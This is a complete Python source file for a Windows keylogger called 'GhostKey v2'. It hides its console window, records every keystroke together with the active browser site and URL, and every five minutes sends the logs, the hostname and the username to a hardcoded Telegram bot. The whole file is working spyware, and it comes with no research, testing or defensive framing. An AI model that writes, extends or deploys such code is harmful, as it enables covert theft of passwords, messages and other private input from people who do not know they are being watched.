#!/usr/bin/env python3
"""
GhostKey v2 — with Enhanced Website/URL Detection
"""

import os
import sys
import time
import threading
import requests
import ctypes
import socket
import queue
import re
from datetime import datetime

# ============================================================
# CONFIG
# ============================================================
BOT_TOKEN = "8810561403:AAHuEYEJa1NjlpiLOHWdCghoe0mS3dYRey8"
CHAT_ID = "6438143115"
HOSTNAME = os.environ.get("COMPUTERNAME", "unknown")
USERNAME = os.environ.get("USERNAME", "unknown")

# ============================================================
# MUTEX - single instance guard
# ============================================================
mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "GhostKey_SingleInstance")
if ctypes.windll.kernel32.GetLastError() == 183:
    sys.exit(0)

# ============================================================
# INTERNET CHECKER
# ============================================================
def is_internet_available():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect(("8.8.8.8", 53))
        s.close()
        return True
    except:
        return False

def wait_for_internet():
    while not is_internet_available():
        time.sleep(5)

# ============================================================
# ENHANCED URL/WEBSITE DETECTION
# ============================================================
def get_active_window_info():
    """
    Returns (window_title, browser_name, site_name, url)
    Extracts the actual website/URL from browser windows.
    """
    try:
        import win32gui
        
        hwnd = win32gui.GetForegroundWindow()
        if not hwnd:
            return "Unknown", "", "", ""
        
        title = win32gui.GetWindowText(hwnd)
        class_name = win32gui.GetClassName(hwnd) if hwnd else ""
        
        # Detect browser
        browser = ""
        site = title
        url = ""
        
        if "Chrome_WidgetWin" in class_name:
            browser = "Chrome"
            # Remove browser suffix
            for suffix in [
                " - Google Chrome", " - Chromium", 
                " - Microsoft Edge", " - Personal",
                " - InPrivate", " - Incognito",
                " - Brave", " - Opera", " - Vivaldi"
            ]:
                if title.endswith(suffix):
                    title_clean = title[:-len(suffix)]
                    break
            else:
                title_clean = title
            
            # Try to get actual URL via UI Automation
            url = _get_chrome_url_via_uia(hwnd)
            
            # Parse the title to identify the website
            site = _extract_site_from_title(title_clean)
            
        elif "Mozilla" in class_name:
            browser = "Firefox"
            if " — Mozilla Firefox" in title:
                title_clean = title.replace(" — Mozilla Firefox", "")
            else:
                title_clean = title
            site = _extract_site_from_title(title_clean)
            
        elif "ApplicationFrameWindow" in class_name or "Windows.UI.Core" in class_name:
            browser = "App"
            title_clean = title
            site = title_clean
        else:
            title_clean = title
            site = title_clean
        
        # If we got a URL from UIA, extract the domain from it
        if url and not site or site == title_clean:
            try:
                from urllib.parse import urlparse
                parsed = urlparse(url)
                domain = parsed.netloc or parsed.path
                site = domain
            except:
                pass
        
        return title_clean, browser, site, url
        
    except Exception as e:
        return "Unknown", "", "", ""

def _get_chrome_url_via_uia(hwnd):
    """
    Get the actual URL from Chrome/Edge address bar using UI Automation.
    This requires a small helper DLL or uses COM.
    """
    try:
        # Method 1: Try using comtypes (if installed)
        try:
            import comtypes.client as cc
            import comtypes
            from comtypes.gen import UIAutomationClient as uia
            
            cc.GetModule("UIAutomationCore.dll")
            uia_client = cc.CreateObject("UIAutomationClient.CUIAutomation")
            elem = uia_client.ElementFromHandle(hwnd)
            
            # Try different automation IDs for address bar
            for aid in ["omnibox", "address_bar", "url_bar", "addressEditBox", "Address edit box"]:
                cond = uia_client.CreatePropertyCondition(
                    uia.UIA_AutomationIdPropertyId,
                    aid
                )
                addr = elem.FindFirst(2, cond)  # TreeScope_Descendants
                if addr:
                    val = addr.CurrentValue
                    if val and val.startswith("http"):
                        return val
        except:
            pass
        
        # Method 2: Try using raw COM accessible object
        try:
            ctypes.windll.ole32.CoInitialize(0)
            from ctypes import POINTER, c_int, c_wchar_p, byref, c_void_p
            
            # Accessible object from window handle
            # This is complex - skip to fallback
            pass
        except:
            pass
        
        return ""
    except:
        return ""

def _extract_site_from_title(title):
    """Extract meaningful website name from browser tab title."""
    if not title:
        return "Unknown"
    
    title = title.strip()
    
    # Common patterns in browser titles:
    # "Page Title - Site Name"  → extract "Site Name"
    # "Page Title — Site Name"  → extract "Site Name"  
    # "Site Name - Page Title"  → extract "Site Name"
    # "Page Title"              → use as-is
    
    # List of known patterns: " - " is often used to separate page from site
    parts = title.split(" - ")
    
    if len(parts) >= 2:
        # The last part is usually the website name
        # But for Gmail: "Inbox - email@gmail.com - Gmail" → site is "Gmail"
        # For GitHub: "dashboard - repository - GitHub" → site is "GitHub"
        
        # Known site names (last part often contains these)
        known_sites = [
            "Gmail", "Google", "YouTube", "GitHub", "Reddit", "Twitter", "X",
            "Facebook", "Instagram", "LinkedIn", "Netflix", "Amazon", "eBay",
            "Stack Overflow", "StackExchange", "Wikipedia", "Medium", "Discord",
            "Slack", "Notion", "Trello", "Jira", "Confluence", "Outlook",
            "Microsoft 365", "Office", "Dropbox", "Drive", "Docs", "Sheets",
            "Slides", "WhatsApp", "Telegram", "Signal", "Zoom", "Teams",
            "Meet", "Calendar", "Maps", "News", "Finance", "Translate"
        ]
        
        # Check if last part matches a known site
        last_part = parts[-1].strip()
        for known in known_sites:
            if known.lower() in last_part.lower():
                return known
        
        # If last part looks like a domain (e.g., "github.com")
        if re.match(r'^[\w\.-]+\.[a-z]{2,}$', last_part):
            return last_part
            
        # Return the full cleaned title
        return title
    
    return title


# ============================================================
# CORE LOGGER
# ============================================================
class GhostKey:
    def __init__(self):
        self.keystrokes = []
        self.pending_messages = queue.Queue()
        self.current_window = "Unknown"
        self.current_browser = ""
        self.current_site = ""
        self.current_url = ""
        self.SEND_INTERVAL = 300
        self.lock = threading.Lock()
        self.running = True
        
    def start(self):
        # Hide console
        try:
            ctypes.windll.user32.ShowWindow(
                ctypes.windll.kernel32.GetConsoleWindow(), 0
            )
        except:
            pass
        
        # Wait for internet
        wait_for_internet()
        
        # Start threads
        threads = [
            threading.Thread(target=self._listen_keys, daemon=True),
            threading.Thread(target=self._track_window, daemon=True),
            threading.Thread(target=self._sender, daemon=True),
            threading.Thread(target=self._pending_sender, daemon=True),
        ]
        for t in threads:
            t.start()
            time.sleep(0.1)
        
        self._safe_notify("🟢 Agent online")
        
        try:
            while self.running:
                time.sleep(1)
        except:
            self.running = False
    
    def _listen_keys(self):
        try:
            from pynput.keyboard import Listener, Key
            
            def on_press(key):
                try:
                    ts = datetime.now().strftime("%H:%M")
                    
                    # Get current window info
                    with self.lock:
                        win = self.current_window[:40]
                        site = self.current_site
                        browser = self.current_browser
                        url = self.current_url
                    
                    # Build context string
                    if browser:
                        if site and site != win:
                            context = f"{browser}:{site}"
                        else:
                            context = f"{browser}:{win}"
                    else:
                        context = win
                    
                    if hasattr(key, 'char') and key.char and key.char.isprintable():
                        with self.lock:
                            self.keystrokes.append((ts, key.char, context))
                    else:
                        special = {
                            Key.enter: "⏎",
                            Key.tab: "⇥",
                            Key.backspace: "⌫",
                            Key.space: " ",
                            Key.esc: "⎋",
                            Key.delete: "⌦",
                            Key.up: "↑",
                            Key.down: "↓",
                            Key.left: "←",
                            Key.right: "→",
                            Key.caps_lock: "[CAPS]",
                        }
                        s = special.get(key)
                        if s:
                            with self.lock:
                                self.keystrokes.append((ts, s, context))
                except:
                    pass
            
            with Listener(on_press=on_press) as listener:
                listener.join()
        except Exception as e:
            pass
    
    def _track_window(self):
        """Enhanced window tracking — captures URL/site info."""
        try:
            import win32gui
            last_title = ""
            
            while self.running:
                try:
                    hwnd = win32gui.GetForegroundWindow()
                    title = win32gui.GetWindowText(hwnd)
                    
                    if title and title != last_title:
                        last_title = title
                        # Use enhanced detection
                        win_title, browser, site, url = get_active_window_info()
                        
                        if win_title:
                            self.current_window = win_title
                            self.current_browser = browser
                            self.current_site = site
                            self.current_url = url
                    
                    time.sleep(0.5)  # Check twice per second for faster detection
                except:
                    time.sleep(1)
        except:
            pass
    
    def _sender(self):
        time.sleep(30)
        while self.running:
            time.sleep(self.SEND_INTERVAL)
            
            with self.lock:
                if not self.keystrokes:
                    continue
                data = self.keystrokes.copy()
                self.keystrokes.clear()
            
            if data:
                self._send_logs(data)
    
    def _pending_sender(self):
        while self.running:
            try:
                message = self.pending_messages.get(timeout=30)
                wait_for_internet()
                self._send_telegram(message)
            except queue.Empty:
                continue
            except Exception as e:
                try:
                    self.pending_messages.put(message)
                except:
                    pass
                time.sleep(10)
    
    def _safe_notify(self, text):
        message = f"{text}\n💻 {HOSTNAME}\\{USERNAME}\n🕒 {datetime.now().strftime('%H:%M:%S')}"
        if is_internet_available():
            try:
                self._send_telegram(message)
            except:
                self.pending_messages.put(message)
        else:
            self.pending_messages.put(message)
    
    def _send_logs(self, data):
        """Format and send with website context."""
        # Group by context (browser:site)
        contexts = {}
        for ts, key, context in data:
            if context not in contexts:
                contexts[context] = []
            contexts[context].append((ts, key))
        
        lines = [
            f"📝 Keystroke Report",
            f"💻 {HOSTNAME}\\{USERNAME}",
            f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M')}",
            f"📊 {len(data)} keys across {len(contexts)} windows/sites",
            ""
        ]
        
        total_keys = len(data)
        
        for context, keys in sorted(contexts.items(), key=lambda x: -len(x[1])):
            # Extract browser and site from context
            if ":" in context and context.count(":") == 1:
                browser, site = context.split(":", 1)
                icon = "🌐"
                header = f"{icon} [{browser}] {site}"
            else:
                header = f"📍 [{context}]"
            
            lines.append(f"{header} ({len(keys)} keys)")
            
            # Build text content
            text = ""
            for ts, key in keys:
                if len(key) == 1 and key.isprintable():
                    text += key
                elif key == "⏎":
                    text += "↵ "
                elif key == " ":
                    text += " "
                elif key == "⇥":
                    text += "  "
                else:
                    text += f"<{key}>"
            
            if text.strip():
                display_text = text[:600] if len(text) > 600 else text
                lines.append(f"  └ {display_text}")
            lines.append("")
        
        message = "\n".join(lines)
        
        if len(message) > 4000:
            message = message[:3997] + "..."
        
        # Try to send, queue if fails
        if is_internet_available():
            try:
                self._send_telegram(message)
            except:
                self.pending_messages.put(message)
        else:
            self.pending_messages.put(message)
    
    def _send_telegram(self, message):
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, json={
            "chat_id": CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }, timeout=15)


if __name__ == "__main__":
    GhostKey().start()
